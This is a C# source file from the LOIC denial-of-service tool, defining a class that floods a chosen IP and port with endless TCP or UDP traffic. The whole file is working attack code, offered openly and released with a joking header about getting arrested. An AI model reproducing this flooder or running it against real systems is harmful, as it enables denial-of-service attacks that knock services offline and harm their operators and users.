/* LOIC - Low Orbit Ion Cannon
 * Released to the public domain
 * Enjoy getting v&, kids.
 */

using System;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;

namespace LOIC
{
	public class XXPFlooder : cHLDos
	{
		private BackgroundWorker bw;

		private readonly string IP;
		private readonly int Port;
		private readonly int Protocol;
		private readonly bool Resp;
		private readonly string Data;
		private readonly bool AllowRandom;

		public XXPFlooder(string ip, int port, int proto, int delay, bool resp, string data, bool random)
		{
			this.IP = ip;
			this.Port = port;
			this.Protocol = proto;
			this.Delay = delay;
			this.Resp = resp;
			this.Data = data;
			this.AllowRandom = random;
			this.Requested = 0;
			this.Failed = 0;
		}
		public override void Start()
		{
			this.IsFlooding = true;
			this.bw = new BackgroundWorker();
			this.bw.DoWork += bw_DoWork;
			this.bw.RunWorkerAsync();
			this.bw.WorkerSupportsCancellation = true;
		}
		public override void Stop()
		{
			this.IsFlooding = false;
			this.bw.CancelAsync();
		}
		private void bw_DoWork(object sender, DoWorkEventArgs e)
		{
			try
			{
				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(IP), Port);
				while (this.IsFlooding)
				{
					State = ReqState.Ready; // SET STATE TO READY //
					if(Protocol == (int)LOIC.Protocol.TCP)
					{
						using (Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp))
						{
							socket.NoDelay = true;
							State = ReqState.Connecting; // SET STATE TO CONNECTING //

							try { socket.Connect(RHost); }
							catch { continue; }

							socket.Blocking = Resp;
							State = ReqState.Requesting; // SET STATE TO REQUESTING //

							try
							{
								while (this.IsFlooding)
								{
									Requested++;
									byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : "")));
									socket.Send(buf);
									if (Delay >= 0) System.Threading.Thread.Sleep(Delay + 1);
								}
							}
							catch { Failed++; }
						}
					}
					if(Protocol == (int)LOIC.Protocol.UDP)
					{
						using (Socket socket = new Socket(RHost.AddressFamily, SocketType.Dgram, ProtocolType.Udp))
						{
							socket.Blocking = Resp;
							State = ReqState.Requesting; // SET STATE TO REQUESTING //

							try
							{
								while (this.IsFlooding)
								{
									Requested++;
									byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : "")));
									socket.SendTo(buf, SocketFlags.None, RHost);
									if (Delay >= 0) System.Threading.Thread.Sleep(Delay + 1);
								}
							}
							catch { Failed++; }
						}
					}
				}
			}
			// Analysis disable once EmptyGeneralCatchClause
			catch { }
			finally { State = ReqState.Ready; this.IsFlooding = false; }
		}
	}
}